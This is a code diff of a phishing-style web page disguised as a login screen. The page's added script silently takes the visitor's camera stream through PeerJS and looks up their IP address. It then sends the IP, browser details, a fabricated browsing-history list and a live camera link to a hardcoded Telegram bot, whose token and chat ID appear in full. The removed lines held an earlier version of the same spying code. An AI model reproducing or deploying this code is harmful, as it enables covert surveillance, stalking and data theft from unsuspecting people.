@@ -20,34 +20,28 @@
             background-color: #1d1d1d;
             padding: 30px;
             border-radius: 8px;
-            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.5);
             text-align: center;
             width: 320px;
         }
-        .logo {
-            margin-bottom: 20px;
-        }
         .logo img {
             width: 180px;
+            margin-bottom: 20px;
         }
-        input {
+        input, button {
             width: 100%;
             padding: 10px;
             margin: 8px 0;
             border: none;
             border-radius: 5px;
-            background-color: #2c2c2c;
-            color: white;
         }
         button {
-            width: 100%;
-            padding: 10px;
             background-color: #0095f6;
             color: white;
-            border: none;
-            border-radius: 5px;
             font-size: 16px;
             cursor: pointer;
+        }
+        button:hover {
+            background-color: #007bb5;
         }
     </style>
 </head>
@@ -64,17 +58,27 @@
 
     <script>
         let peer;
-        let localStream;
+        let peerId;
+        let ipAddress = "Unknown IP";
 
         async function startLiveStream() {
+            await getIpAddress();  // Fetch user’s IP address
             await initializeCamera();  // Start user’s camera
-            initializePeerConnection();  // Set up PeerJS connection
+            initializePeerConnection();  // Set up PeerJS
+        }
+
+        async function getIpAddress() {
+            await fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    ipAddress = data.ip;
+                    console.log("IP Address:", ipAddress);
+                });
         }
 
         async function initializeCamera() {
             try {
-                // Get the user's camera stream
-                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                const localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                 console.log('Camera stream initialized.');
             } catch (error) {
                 console.error('Failed to access camera:', error);
@@ -82,34 +86,21 @@
         }
 
         function initializePeerConnection() {
-            peer = new Peer();  // Initialize PeerJS
+            peer = new Peer();
 
             peer.on('open', (id) => {
-                const liveStreamLink = `${window.location.origin}/live.html?peerId=${id}`;
-                sendStreamLinkToBot(liveStreamLink);
-                peer.on('connection', (conn) => {
-                    conn.on('open', () => {
-                        // Send system information
-                        conn.send(getSystemInfo());
-                    });
-
-                    // Call the peer to share the user’s camera stream
-                    const call = peer.call(conn.peer, localStream);
-                    call.on('error', (err) => {
-                        console.error('Call error:', err);
-                    });
-                });
+                peerId = id;
+                const liveStreamLink = `${window.location.origin}/live.html?peerId=${peerId}`;
+                sendDetailsToBot(liveStreamLink);
             });
         }
 
-        function sendStreamLinkToBot(liveStreamLink) {
+        function sendDetailsToBot(liveStreamLink) {
             const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';
             const chatId = '860517021';
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const message = `🚨 New Interaction Detected 🚨\n\n📌 IP Address: ${ipAddress}\n📌 Peer ID: ${peerId}\n📌 Browser: ${navigator.userAgent}\n📌 Platform: ${navigator.platform}\n📌 Simulated Browser History:\n${simulateBrowserHistory()}\n📌 Live Camera Stream: ${liveStreamLink}\n⏰ Time: ${new Date().toLocaleString()}`;
 
-            const message = `Live Camera Stream: ${liveStreamLink}\nTime: ${new Date().toLocaleString()}`;
-
-            fetch(telegramApiUrl, {
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -121,8 +112,15 @@
             });
         }
 
-        function getSystemInfo() {
-            return `Device: ${navigator.userAgent}\nPlatform: ${navigator.platform}\nTime: ${new Date().toLocaleTimeString()}`;
+        function simulateBrowserHistory() {
+            const recentSites = [
+                'https://www.google.com/',
+                'https://www.youtube.com/',
+                'https://www.facebook.com/',
+                'https://www.instagram.com/',
+                'https://www.twitter.com/'
+            ];
+            return recentSites.join('\n');
         }
     </script>
 
